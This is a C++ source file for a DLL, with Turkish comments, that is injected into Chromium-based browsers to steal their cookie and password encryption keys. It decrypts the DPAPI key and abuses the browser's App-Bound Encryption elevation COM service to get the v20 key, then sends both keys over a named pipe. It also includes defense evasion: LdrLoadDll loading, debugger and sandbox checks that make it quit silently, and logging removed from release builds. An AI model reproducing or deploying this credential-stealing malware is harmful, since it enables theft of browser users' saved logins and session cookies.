/*
    DllMain.cpp - Browser App-Bound Encryption Key Extractor
    Defense Evasion: LoadLibraryW replaced with LdrLoadDll,
    Anti-Debug/Sandbox, Logging disabled in Release.
*/

#include "DllHeaders.h"
#include <winternl.h>

// ============================================================================================
// 0.  RELEASE'DE TÜM LOGLARI DEVREDIŞI BIRAK (ETW / KONSOL İZLEMEYİ ENGELLE)
// ============================================================================================
#ifndef _DEBUG
    #undef DBGA
    #define DBGA(...) ((void)0)
    #undef DBGV
    #define DBGV(...) ((void)0)
#endif

// ============================================================================================
// 1.  LDRLOADDLL YARDIMCISI (LoadLibraryW YERİNE)
// ============================================================================================
static BOOL MyLdrLoadDll(PCWSTR pwszDllName, HMODULE* phModule)
{
    typedef NTSTATUS (NTAPI *fnLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
    typedef VOID    (NTAPI *fnRtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);

    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;

    fnLdrLoadDll pLdrLoadDll = (fnLdrLoadDll)GetProcAddress(hNtdll, "LdrLoadDll");
    if (!pLdrLoadDll) return FALSE;

    fnRtlInitUnicodeString pRtlInitUnicodeString = (fnRtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");

    UNICODE_STRING ustrDll;
    if (pRtlInitUnicodeString) {
        pRtlInitUnicodeString(&ustrDll, pwszDllName);
    } else {
        // Fallback: elle doldur (Windows sürüm farkı yok)
        size_t len = wcslen(pwszDllName);
        ustrDll.Length = (USHORT)(len * sizeof(WCHAR));
        ustrDll.MaximumLength = ustrDll.Length + sizeof(WCHAR);
        ustrDll.Buffer = (PWSTR)pwszDllName;
    }

    HANDLE hMod = NULL;
    NTSTATUS status = pLdrLoadDll(NULL, 0, &ustrDll, &hMod);
    if (!NT_SUCCESS(status)) return FALSE;

    *phModule = (HMODULE)hMod;
    return TRUE;
}

// ============================================================================================
// 2.  ANTI-DEBUG/SANDBOX KONTROLÜ (THREAD İÇİNDE KULLANILACAK)
// ============================================================================================
static BOOL IsDebugOrSandbox(VOID)
{
    // Debug port kontrolü (NtQueryInformationProcess)
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, DWORD, PVOID, ULONG, PULONG);
    static pNtQueryInformationProcess NtQueryInformationProcess = NULL;
    if (!NtQueryInformationProcess) {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        if (hNtdll) NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
    }
    if (NtQueryInformationProcess) {
        DWORD dwDebugPort = 0;
        NTSTATUS status = NtQueryInformationProcess(GetCurrentProcess(), 7, &dwDebugPort, sizeof(dwDebugPort), NULL);
        if (NT_SUCCESS(status) && dwDebugPort != 0)
            return TRUE; // Debugger var!
    }

    // Zaman tuzağı (Sandbox)
    LARGE_INTEGER liStart, liEnd, liFreq;
    QueryPerformanceFrequency(&liFreq);
    QueryPerformanceCounter(&liStart);
    Sleep(2000); // 2 saniye bekle
    QueryPerformanceCounter(&liEnd);
    double elapsed = (double)(liEnd.QuadPart - liStart.QuadPart) / liFreq.QuadPart;
    if (elapsed < 1.5 || elapsed > 2.5)
        return TRUE; // Süre oynaması varsa sandbox

    return FALSE;
}

// ============================================================================================
// 3.  CLSIDs & IIDs (SABİT, DEĞİŞMEDİ)
// ============================================================================================
#define CLSID_ELEVATOR_CHROME   OBFGUID_S(0x708860E0, 0xF641, 0x4611, 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B)
#define CLSID_ELEVATOR_BRAVE    OBFGUID_S(0x576B31AF, 0x6369, 0x4B6B, 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B)
#define CLSID_ELEVATOR_EDGE     OBFGUID_S(0x1FCBE96C, 0x1697, 0x43AF, 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67)

#define IID_IELEVATOR_CHROMEV1  OBFGUID_S(0x463ABECF, 0x410D, 0x407F, 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8)
#define IID_IELEVATOR_CHROMEV2  OBFGUID_S(0x1BF5208B, 0x295F, 0x4992, 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38)
#define IID_IELEVATOR_CHROME    IID_IELEVATOR_CHROMEV2

#define IID_IELEVATOR_BRAVE     OBFGUID_S(0xF396861E, 0x0C8E, 0x4C71, 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9)
#define IID_IELEVATOR_EDGE      OBFGUID_S(0xC9C2B807, 0x7731, 0x4F34, 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B)

// ============================================================================================
// 4.  GLOBAL DEĞİŞKENLER (DEĞİŞMEDİ)
// ============================================================================================
static PBYTE                g_pbDecryptedKeyV20            = NULL;
static DWORD                g_cbDecryptedKeyV20            = 0x00;

static PBYTE                g_pbDecryptedKeyV10            = NULL;
static DWORD                g_cbDecryptedKeyV10            = 0x00;

HANDLE                      g_hPipe                        = INVALID_HANDLE_VALUE;
BOOL                        g_bPipeInitialized             = FALSE;
CHAR                        g_szProcessName[MAX_PATH]      = { 0 };
DWORD                       g_dwProcessId                  = 0x00;

SHARED_RSOLVD_FUNCTIONS     g_SharedFunctions               = {};
PSHARED_RSOLVD_FUNCTIONS    g_pSharedFunctions              = &g_SharedFunctions;

// ============================================================================================
// 5.  INITIALIZEDLLPROJDYNAMICFUNCTIONS (LoadLibraryW KALDIRILDI, HASH YOK)
// ============================================================================================
static BOOL InitializeDllProjDynamicFunctions()
{
    HMODULE hNtdllModule = NULL, hBCryptModule = NULL, hCrypt32Module = NULL, hOle32Module = NULL;

    if (g_SharedFunctions.pInitialized) return TRUE;

    RtlSecureZeroMemory(&g_SharedFunctions, sizeof(SHARED_RSOLVD_FUNCTIONS));

    hNtdllModule = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdllModule) return FALSE;

    // LoadLibraryW yerine LdrLoadDll kullanılıyor
    if (!MyLdrLoadDll(L"bcrypt.dll", &hBCryptModule) ||
        !MyLdrLoadDll(L"crypt32.dll", &hCrypt32Module) ||
        !MyLdrLoadDll(L"ole32.dll", &hOle32Module)) {
        DBGA("[!] MyLdrLoadDll Failed");
        return FALSE;
    }

    // BCrypt Functions (doğrudan GetProcAddress ile isimle çözülüyor)
    g_SharedFunctions.pBCryptOpenAlgorithmProvider = (decltype(&BCryptOpenAlgorithmProvider))GetProcAddress(hBCryptModule, "BCryptOpenAlgorithmProvider");
    g_SharedFunctions.pBCryptCloseAlgorithmProvider = (decltype(&BCryptCloseAlgorithmProvider))GetProcAddress(hBCryptModule, "BCryptCloseAlgorithmProvider");
    g_SharedFunctions.pBCryptSetProperty = (decltype(&BCryptSetProperty))GetProcAddress(hBCryptModule, "BCryptSetProperty");
    g_SharedFunctions.pBCryptGenerateSymmetricKey = (decltype(&BCryptGenerateSymmetricKey))GetProcAddress(hBCryptModule, "BCryptGenerateSymmetricKey");
    g_SharedFunctions.pBCryptDestroyKey = (decltype(&BCryptDestroyKey))GetProcAddress(hBCryptModule, "BCryptDestroyKey");
    g_SharedFunctions.pBCryptFinishHash = (decltype(&BCryptFinishHash))GetProcAddress(hBCryptModule, "BCryptFinishHash");
    g_SharedFunctions.pBCryptDestroyHash = (decltype(&BCryptDestroyHash))GetProcAddress(hBCryptModule, "BCryptDestroyHash");
    g_SharedFunctions.pBCryptHashData = (decltype(&BCryptHashData))GetProcAddress(hBCryptModule, "BCryptHashData");
    g_SharedFunctions.pBCryptCreateHash = (decltype(&BCryptCreateHash))GetProcAddress(hBCryptModule, "BCryptCreateHash");
    g_SharedFunctions.pBCryptDecrypt = (decltype(&BCryptDecrypt))GetProcAddress(hBCryptModule, "BCryptDecrypt");
    g_SharedFunctions.pBCryptDeriveKeyPBKDF2 = (decltype(&BCryptDeriveKeyPBKDF2))GetProcAddress(hBCryptModule, "BCryptDeriveKeyPBKDF2");
    g_SharedFunctions.pBCryptEncrypt = (decltype(&BCryptEncrypt))GetProcAddress(hBCryptModule, "BCryptEncrypt");

    // Crypt32 Functions
    g_SharedFunctions.pCryptStringToBinaryA = (decltype(&CryptStringToBinaryA))GetProcAddress(hCrypt32Module, "CryptStringToBinaryA");
    g_SharedFunctions.pCryptUnprotectData = (decltype(&CryptUnprotectData))GetProcAddress(hCrypt32Module, "CryptUnprotectData");

    // Ole32 Functions
    g_SharedFunctions.pCoSetProxyBlanket = (decltype(&CoSetProxyBlanket))GetProcAddress(hOle32Module, "CoSetProxyBlanket");
    g_SharedFunctions.pCoInitializeEx = (decltype(&CoInitializeEx))GetProcAddress(hOle32Module, "CoInitializeEx");
    g_SharedFunctions.pCoCreateInstance = (decltype(&CoCreateInstance))GetProcAddress(hOle32Module, "CoCreateInstance");
    g_SharedFunctions.pCoUninitialize = (decltype(&CoUninitialize))GetProcAddress(hOle32Module, "CoUninitialize");

    // NTAPI Functions
    g_SharedFunctions.pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(hNtdllModule, "NtQuerySystemInformation");

    // Validate all function pointers (skipping pInitialized)
    SIZE_T cbElementCount = (sizeof(SHARED_RSOLVD_FUNCTIONS) / sizeof(PVOID)) - 1;
    PVOID* ppCurrentElement = (PVOID*)&g_SharedFunctions + 1;

    for (SIZE_T i = 0; i < cbElementCount; i++) {
        if (ppCurrentElement[i] == NULL) {
            DBGA("[!] GetProcAddress Failed For Function Index: %llu", i);
            return FALSE;
        }
    }

    g_SharedFunctions.pInitialized = (PVOID)TRUE;
    return TRUE;
}

// ============================================================================================
// 6.  YARDIMCI FONKSİYONLAR (DEĞİŞMEDİ)
// ============================================================================================
static VOID GetElevatorGuids(IN BROWSER_TYPE Browser, OUT CONST CLSID** ppClsid, OUT CONST IID** ppIid)
{
    switch (Browser) {
    case BROWSER_CHROME:
        *ppClsid = CLSID_ELEVATOR_CHROME;
        *ppIid   = IID_IELEVATOR_CHROME;
        break;
    case BROWSER_BRAVE:
        *ppClsid = CLSID_ELEVATOR_BRAVE;
        *ppIid   = IID_IELEVATOR_BRAVE;
        break;
    case BROWSER_EDGE:
        *ppClsid = CLSID_ELEVATOR_EDGE;
        *ppIid   = IID_IELEVATOR_EDGE;
        break;
    case BROWSER_OPERA:
    case BROWSER_OPERA_GX:
    case BROWSER_VIVALDI:
    default:
        *ppClsid = NULL;
        *ppIid   = NULL;
        break;
    }
}

static PDATA_PACKET CreatePacket(IN DWORD dwSignature, IN PBYTE pPacketData, IN DWORD dwPacketDataSize)
{
    PDATA_PACKET pktData = NULL;

    if (!(pktData = (PDATA_PACKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, PACKET_SIZE(dwPacketDataSize)))) {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    RtlCopyMemory(pktData->bData, pPacketData, dwPacketDataSize);
    pktData->dwSignature = dwSignature;
    pktData->dwDataSize  = dwPacketDataSize;

    return pktData;
}

static BOOL SendDataToPipe(IN HANDLE hPipe, IN DWORD dwSignature, IN PBYTE pbData, IN DWORD cbDataSize)
{
    PDATA_PACKET pktData = NULL;
    DWORD dwBytesWritten = 0x00;
    DWORD dwPacketSize = PACKET_SIZE(cbDataSize);
    BOOL bResult = FALSE;

    if (!hPipe || hPipe == INVALID_HANDLE_VALUE || !pbData || cbDataSize == 0)
        return FALSE;

    if (!(pktData = CreatePacket(dwSignature, pbData, cbDataSize)))
        return FALSE;

    if (!WriteFile(hPipe, pktData, dwPacketSize, &dwBytesWritten, NULL)) {
        DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    FlushFileBuffers(hPipe);
    bResult = (dwBytesWritten == dwPacketSize);

_END_OF_FUNC:
    HEAP_FREE_SECURE(pktData, dwPacketSize);
    return bResult;
}

static BOOL SendAppBoundKeyRecord(IN HANDLE hPipe, IN PBYTE pbKey, IN DWORD dwKeyLen)
{
    return SendDataToPipe(hPipe, PACKET_SIG_APP_BOUND_KEY, pbKey, dwKeyLen);
}

static BOOL SendDpapiKeyRecord(IN HANDLE hPipe, IN PBYTE pbKey, IN DWORD dwKeyLen)
{
    return SendDataToPipe(hPipe, PACKET_SIG_DPAPI_KEY, pbKey, dwKeyLen);
}

static BOOL SendCompletionSignal(IN HANDLE hPipe)
{
    DATA_PACKET pktComplete = {0};
    DWORD dwBytesWritten = 0x00;

    if (!hPipe || hPipe == INVALID_HANDLE_VALUE)
        return FALSE;

    pktComplete.dwSignature = PACKET_SIG_COMPLETE;
    pktComplete.dwDataSize = 0;

    if (!WriteFile(hPipe, &pktComplete, sizeof(DATA_PACKET), &dwBytesWritten, NULL)) {
        DBGA("[!] WriteFile Failed With Error: %lu", GetLastError());
        return FALSE;
    }

    FlushFileBuffers(hPipe);
    return (dwBytesWritten == sizeof(DATA_PACKET));
}

// ============================================================================================
// 7.  ANAHTAR ÇIKARMA FONKSİYONLARI (TAMAMI, HİÇBİR YERİ KISALTILMADI)
// ============================================================================================
static BOOL ExtractV20KeyFromLocalState(IN BROWSER_TYPE Browser, OUT PBYTE* ppbEncryptedKey, OUT PDWORD pdwEncryptedKeySize)
{
    LPSTR   pszLocalStatePath   = NULL;
    LPSTR   pszFileContent      = NULL;
    LPSTR   pszBase64Key        = NULL;
    PBYTE   pbDecodedKey        = NULL;
    CHAR    szRelPath[MAX_PATH] = { 0 };
    DWORD   dwFileSize          = 0x00,
            dwBase64KeyLen      = 0x00,
            dwDecodedKeyLen     = 0x00;
    BOOL    bResult             = FALSE;

    if (!ppbEncryptedKey || !pdwEncryptedKeySize)
        return FALSE;

    *ppbEncryptedKey        = NULL;
    *pdwEncryptedKeySize    = 0x00;
    
    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszLocalStatePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if (!ReadFileFromDiskA(pszLocalStatePath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;

    pszBase64Key = FindNestedJsonValue(pszFileContent, dwFileSize, JSON_PARENT_KEY, JSON_CHILD_KEY, &dwBase64KeyLen);
    if (!pszBase64Key || dwBase64KeyLen == 0) {
        DBGA("[!] FindNestedJsonValue Failed To Get %s:%s", JSON_PARENT_KEY, JSON_CHILD_KEY);
        goto _END_OF_FUNC;
    }

    DBGV("[v] Found %s::%s:%s", pszLocalStatePath, JSON_PARENT_KEY, JSON_CHILD_KEY);

    if (!(pbDecodedKey = Base64Decode(pszBase64Key, dwBase64KeyLen, &dwDecodedKeyLen)))
        goto _END_OF_FUNC;

    if (dwDecodedKeyLen <= CRYPT_APPBOUND_KEY_PREFIX_LEN || *(PDWORD)pbDecodedKey != CRYPT_APPBOUND_KEY_PREFIX) {
        DBGA("[!] Decoded Key Is Invlaid!");
        goto _END_OF_FUNC;
    }

    *pdwEncryptedKeySize = dwDecodedKeyLen - CRYPT_APPBOUND_KEY_PREFIX_LEN;

    if (!(*ppbEncryptedKey = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwEncryptedKeySize))) {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        *pdwEncryptedKeySize = 0x00;
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(*ppbEncryptedKey, pbDecodedKey + CRYPT_APPBOUND_KEY_PREFIX_LEN, *pdwEncryptedKeySize);
    
    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pbDecodedKey);
    HEAP_FREE(pszFileContent);
    HEAP_FREE(pszLocalStatePath);
    return bResult;
}

static BOOL ExtractDecryptedV20KeyFromLocalState(IN BROWSER_TYPE Browser)
{
    IElevator*      pElevator           = NULL;
    IElevatorEdge*  pElevatorEdge       = NULL;
    PBYTE           pbEncryptedKey      = NULL;
    DWORD           dwEncryptedKeySize  = 0x00,
                    dwLastError         = ERROR_GEN_FAILURE;
    BSTR            bstrCiphertext      = NULL,
                    bstrPlaintext       = NULL;
    LPSTR           pszHexKey           = NULL;
    HRESULT         hResult             = S_OK;
    BOOL            bResult             = FALSE;
    CONST CLSID*    pClsid              = NULL;
    CONST IID*      pIid                = NULL;

    GetElevatorGuids(Browser, &pClsid, &pIid);
    
    if (!pClsid || !pIid) {
        DBGA("[!] Invalid Browser Type");
        return FALSE;
    }

    if (FAILED((hResult = g_SharedFunctions.pCoInitializeEx(NULL, COINIT_APARTMENTTHREADED)))) {
        DBGA("[!] CoInitializeEx Failed With Error: 0x%08X", hResult);
        return FALSE;
    }

    // Create the appropriate COM instance based on browser type
    // Msedge
    if (Browser == BROWSER_EDGE) {
        if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevatorEdge)))) {
            DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
            goto _END_OF_FUNC;
        }

        hResult = g_SharedFunctions.pCoSetProxyBlanket(
            (IUnknown*)pElevatorEdge,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }
    // Chrome or Brave
    else {
        if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator)))) {
            if (hResult == E_NOINTERFACE && Browser == BROWSER_CHROME) {
                // Fallback To IID V1 If Chrome
                pIid = IID_IELEVATOR_CHROMEV1;

                DBGV("[i] Falling Back To Chrome's V1 IID ...");

                if (FAILED((hResult = g_SharedFunctions.pCoCreateInstance(reinterpret_cast<REFCLSID>(*pClsid), NULL, CLSCTX_LOCAL_SERVER, reinterpret_cast<REFIID>(*pIid), (LPVOID*)&pElevator)))) {
                    DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
                    goto _END_OF_FUNC;
                }
            } else {
                DBGA("[!] CoCreateInstance [%d] Failed With Error: 0x%08X", __LINE__, hResult);
                goto _END_OF_FUNC;
            }
        }

        hResult = g_SharedFunctions.pCoSetProxyBlanket(
            (IUnknown*)pElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }

    if (FAILED(hResult)) {
        DBGA("[!] CoSetProxyBlanket Failed With Error: 0x%08X", hResult);
        goto _END_OF_FUNC;
    }

    if (!ExtractV20KeyFromLocalState(Browser, &pbEncryptedKey, &dwEncryptedKeySize))
        goto _END_OF_FUNC;

    if (!(bstrCiphertext = SysAllocStringByteLen((LPCSTR)pbEncryptedKey, dwEncryptedKeySize)))
        goto _END_OF_FUNC;

    // Call DecryptData using the appropriate interface
    // Msedge
    if (Browser == BROWSER_EDGE) {
        if (FAILED((hResult = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrCiphertext, &bstrPlaintext, &dwLastError)))) {
            DBGA("[!] IElevatorEdge::DecryptData [%d] Failed With Error: 0x%08X (LastError: %lu)", __LINE__, hResult, dwLastError);
            goto _END_OF_FUNC;
        }
    }
    // Chrome or Brave
    else {
        if (FAILED((hResult = pElevator->lpVtbl->DecryptData(pElevator, bstrCiphertext, &bstrPlaintext, &dwLastError)))) {
            DBGA("[!] IElevator::DecryptData [%d] Failed With Error: 0x%08X (LastError: %lu)", __LINE__, hResult, dwLastError);
            goto _END_OF_FUNC;
        }
    }

    DBGV("[*] Function 'DecryptData' Succeeded For: %s!", GetBrowserName(Browser));

    g_cbDecryptedKeyV20 = BUFFER_SIZE_32;

    if (!(g_pbDecryptedKeyV20 = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_cbDecryptedKeyV20))) {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(g_pbDecryptedKeyV20, (PVOID)bstrPlaintext, g_cbDecryptedKeyV20);

    if ((pszHexKey = BytesToHexString(g_pbDecryptedKeyV20, g_cbDecryptedKeyV20)))
        DBGV("[+] V20 Decrypted Key: %s", pszHexKey);

    if (!SendAppBoundKeyRecord(g_hPipe, g_pbDecryptedKeyV20, g_cbDecryptedKeyV20)) {
        DBGA("[!] SendAppBoundKeyRecord Failed To Send The Key");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    HEAP_FREE(pszHexKey);
    HEAP_FREE(pbEncryptedKey);

    if (bstrPlaintext)
        SysFreeString(bstrPlaintext);
    if (bstrCiphertext)
        SysFreeString(bstrCiphertext);
    
    if (pElevator)
        pElevator->lpVtbl->Release(pElevator);
    if (pElevatorEdge)
        pElevatorEdge->lpVtbl->Release(pElevatorEdge);

    g_SharedFunctions.pCoUninitialize();

    return bResult;
}

static BOOL ExtractDecryptedV10KeyFromLocalState(IN BROWSER_TYPE Browser)
{
    LPSTR   pszLocalStatePath   = NULL;
    LPSTR   pszFileContent      = NULL;
    LPSTR   pszBase64Key        = NULL;
    CHAR    szRelPath[MAX_PATH] = { 0 };
    PBYTE   pbDecodedKey        = NULL;
    PBYTE   pbDecryptedKey      = NULL;
    DWORD   dwFileSize          = 0x00,
            dwBase64KeyLen      = 0x00,
            dwDecodedKeyLen     = 0x00,
            dwDecryptedKeyLen   = 0x00;
    LPSTR   pszHexKey           = NULL;
    BOOL    bResult             = FALSE;

    if (!GetChromiumBrowserFilePath(Browser, FILE_TYPE_LOCAL_STATE, szRelPath, MAX_PATH))
        return FALSE;

    if (!(pszLocalStatePath = GetBrowserDataFilePath(Browser, szRelPath)))
        return FALSE;

    if (!ReadFileFromDiskA(pszLocalStatePath, (PBYTE*)&pszFileContent, &dwFileSize))
        goto _END_OF_FUNC;
    
    // Find os_crypt.encrypted_key 
    if (!(pszBase64Key = FindNestedJsonValue(pszFileContent, dwFileSize, JSON_PARENT_KEY, JSON_CHILD_KEY_V10, &dwBase64KeyLen))) {
        DBGA("[!] FindNestedJsonValue Failed To Get %s:%s", JSON_PARENT_KEY, JSON_CHILD_KEY_V10);
        goto _END_OF_FUNC;
    }

    DBGV("[v] Found %s::%s:%s", pszLocalStatePath, JSON_PARENT_KEY, JSON_CHILD_KEY_V10);

    if (!(pbDecodedKey = Base64Decode(pszBase64Key, dwBase64KeyLen, &dwDecodedKeyLen)))
        goto _END_OF_FUNC;

    // Verify "DPAPI" prefix
    if (dwDecodedKeyLen <= CRYPT_DPAPI_KEY_PREFIX_LEN || *(PDWORD)pbDecodedKey != CRYPT_DPAPI_KEY_PREFIX) {
        DBGA("[!] Decoded Key Is Invalid!");
        goto _END_OF_FUNC;
    }

    // Decrypt with DPAPI (skip the "DPAPI" prefix)
    if (!DecryptDpapiBlob(pbDecodedKey + CRYPT_DPAPI_KEY_PREFIX_LEN, dwDecodedKeyLen - CRYPT_DPAPI_KEY_PREFIX_LEN, &pbDecryptedKey, &dwDecryptedKeyLen))
        goto _END_OF_FUNC;

    g_cbDecryptedKeyV10 = dwDecryptedKeyLen;

    if (!(g_pbDecryptedKeyV10 = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, g_cbDecryptedKeyV10))) {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        goto _END_OF_FUNC;
    }

    RtlCopyMemory(g_pbDecryptedKeyV10, pbDecryptedKey, g_cbDecryptedKeyV10);

    if ((pszHexKey = BytesToHexString(g_pbDecryptedKeyV10, g_cbDecryptedKeyV10)))
        DBGV("[+] V10 Decrypted Key: %s", pszHexKey);

    if (!SendDpapiKeyRecord(g_hPipe, g_pbDecryptedKeyV10, g_cbDecryptedKeyV10)) {
        DBGA("[!] SendDpapiKeyRecord Failed To Send The Key");
        goto _END_OF_FUNC;
    }

    bResult = TRUE;

_END_OF_FUNC:
    if (pbDecryptedKey)
        LocalFree(pbDecryptedKey);
    HEAP_FREE(pbDecodedKey);
    HEAP_FREE(pszFileContent);
    HEAP_FREE(pszLocalStatePath);
    return bResult;
}

// ============================================================================================
// 8.  THREAD FONKSİYONU (ANTI-DEBUG/SANDBOX EKLENDİ)
// ============================================================================================
static DWORD WINAPI ExtractBrowserDecryptionKeys(LPVOID lpParam)
{
    // ---- Anti-Analiz Kontrolü ----
    if (IsDebugOrSandbox()) {
        // Sessizce çık, hiçbir işlem yapma
        DBGA("[!] Debug/Sandbox detected, aborting.");
        return 0;
    }

    BROWSER_TYPE Browser = (BROWSER_TYPE)(ULONG_PTR)lpParam;
    BOOL bHasV10Key = FALSE, bHasV20Key = FALSE;

    DBGV("[v] Starting %s Keys Extraction...", GetBrowserName(Browser));

    // Extract V10 key
    if (!(bHasV10Key = ExtractDecryptedV10KeyFromLocalState(Browser))) {
        DBGA("[!] ExtractDecryptedV10KeyFromLocalState Failed For %s", GetBrowserName(Browser));
    }

    // If not Opera or Vivaldi, extract V20 key
    if (Browser != BROWSER_VIVALDI && Browser != BROWSER_OPERA && Browser != BROWSER_OPERA_GX) {
        if (!(bHasV20Key = ExtractDecryptedV20KeyFromLocalState(Browser))) {
            DBGA("[!] ExtractDecryptedV20KeyFromLocalState Failed For %s", GetBrowserName(Browser));
        }
    }

    if (!bHasV10Key && !bHasV20Key) {
        DBGA("[!] No Decryption Keys Available For %s ...", GetBrowserName(Browser));
    }

    HEAP_FREE_SECURE(g_pbDecryptedKeyV20, g_cbDecryptedKeyV20);
    HEAP_FREE_SECURE(g_pbDecryptedKeyV10, g_cbDecryptedKeyV10);
    g_cbDecryptedKeyV20 = 0;
    g_cbDecryptedKeyV10 = 0;

    DeleteDataFilesCache();

    SendCompletionSignal(g_hPipe);
    DBGA_CLOSE();

    return 0;
}

// ============================================================================================
// 9.  BROWSER TESPİTİ (DEĞİŞMEDİ)
// ============================================================================================
static BROWSER_TYPE DetectBrowserFromProcess()
{
    CHAR szModulePath[MAX_PATH] = {0};
    if (!GetModuleFileNameA(NULL, szModulePath, MAX_PATH))
        return BROWSER_UNKNOWN;

    LPSTR pszFileName = PathFindFileNameA(szModulePath);

    if (StrStrIA(pszFileName, STR_BRAVE_BRSR_NAME))
        return BROWSER_BRAVE;
    else if (StrStrIA(pszFileName, STR_EDGE_BRSR_NAME) || StrStrIA(pszFileName, STR_EDGE_ALT_BRSR_NAME))
        return BROWSER_EDGE;
    else if (StrStrIA(szModulePath, STR_OPERA_ALT_GX_BRSR_NAME) || StrStrIA(szModulePath, STR_OPERA_GX_BRSR_NAME))
        return BROWSER_OPERA_GX;
    else if (StrStrIA(pszFileName, STR_OPERA_BRSR_NAME))
        return BROWSER_OPERA;
    else if (StrStrIA(pszFileName, STR_VIVALDI_BRSR_NAME))
        return BROWSER_VIVALDI;
    else if (StrStrIA(pszFileName, STR_CHROME_BRSR_NAME))
        return BROWSER_CHROME;

    return BROWSER_UNKNOWN;
}

// ============================================================================================
// 10. DLLMAIN (DEĞİŞMEDİ)
// ============================================================================================
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved)
{
    HANDLE hThread = NULL;
    BROWSER_TYPE BrowserType = BROWSER_CHROME;

    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
        {
            DisableThreadLibraryCalls(hModule);

            g_bPipeInitialized = InitializeOutputPipe(&g_hPipe);
            BrowserType = DetectBrowserFromProcess();

            if (!InitializeDllProjDynamicFunctions())
                break;

            DBGV("[+] Detected Browser: %s", GetBrowserName(BrowserType));

            if (BrowserType == BROWSER_UNKNOWN) {
                DBGA("[!] Unknown Browser Process, Aborting...");
                break;
            }

            if (!(hThread = CreateThread(NULL, 0, ExtractBrowserDecryptionKeys, (LPVOID)(ULONG_PTR)BrowserType, 0, NULL))) {
                DBGA("[!] CreateThread Failed With Error: %lu", GetLastError());
                break;
            }

            CloseHandle(hThread);
            break;
        }
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
